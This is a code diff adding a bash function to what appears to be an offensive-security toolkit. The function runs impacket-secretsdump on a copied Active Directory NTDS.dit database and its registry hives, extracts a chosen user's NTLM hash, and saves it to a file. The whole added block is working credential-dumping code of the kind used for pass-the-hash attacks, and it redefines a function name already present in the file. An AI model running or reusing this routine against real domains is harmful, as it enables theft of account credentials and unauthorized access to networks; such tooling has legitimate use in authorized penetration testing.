@@ -303,6 +303,62 @@ get_ntlm_hashes_from_ntds() {
 
 }
 
+get_ntlm_hashes_from_ntds() {
+    #if [[ -z $target_username ]]; then
+    #    echo "No target username provided"
+    #    return 1
+    #fi
+    local secrets_dump_options=""
+    if [[ -z $target_ntds ]]; then
+        target_ntds=ntds.dit
+        echo "No target NTDS provided, using default $target_ntds"
+    fi
+    if [[ ! -f "$target_ntds" ]]; then
+        echo "No target NTDS provided and default $target_ntds not found, cannot get hashes from secretsdump."
+        return 1
+    fi
+    secrets_dump_options+=" -ntds $target_ntds"
+    if [[ -z $target_system ]]; then
+        target_system=system.hive
+        echo "No target SYSTEM provided, using default $target_system"
+    fi
+    if [[ ! -f "$target_system" ]]; then
+        echo "No target SYSTEM provided and default $target_system not found, cannot get hashes from secretsdump."
+        return 1
+    fi
+    if [[ -z $target_security ]]; then
+        target_security=security.hive
+        echo "No target SECURITY provided, using default $target_security"
+    fi
+    if [[ ! -f "$target_security" ]]; then
+        echo "No target SECURITY provided and default $target_security not found, cannot get hashes from secretsdump."
+        return 1
+    fi
+    secrets_dump_options+=" -security $target_security"
+    secrets_dump_options+=" -system $target_system"
+    if [[ -z "$dump_file_base" ]]; then
+        dump_file_base=hashes.secretsdump
+    fi
+    local dump_file="$dump_file_base.ntds"
+    if [[ ! -f "$dump_file" ]]; then
+        echo "Secrets dump file $dump_file not found, creating it..."
+        impacket-secretsdump $secrets_dump_options LOCAL -outputfile $dump_file_base
+    fi
+
+    #replace the hashfile
+    if [[ -z "$target_domain" ]]; then
+        hash_file=$dump_file_base.$target_username
+    else
+        hash_file=$dump_file_base.$target_domain.$target_username
+    fi
+    ntlm_hash=$(cat "$dump_file" | grep $target_username | head -n 1 | awk -F':' '{print $4}')
+    if [[ -z $ntlm_hash ]]; then
+        echo "No NTLM hash found for $target_username"
+        return 1
+    fi
+    echo $ntlm_hash > $hash_file
+
+}
 
 get_ntlm_hashes_from_sam_hives() {
 
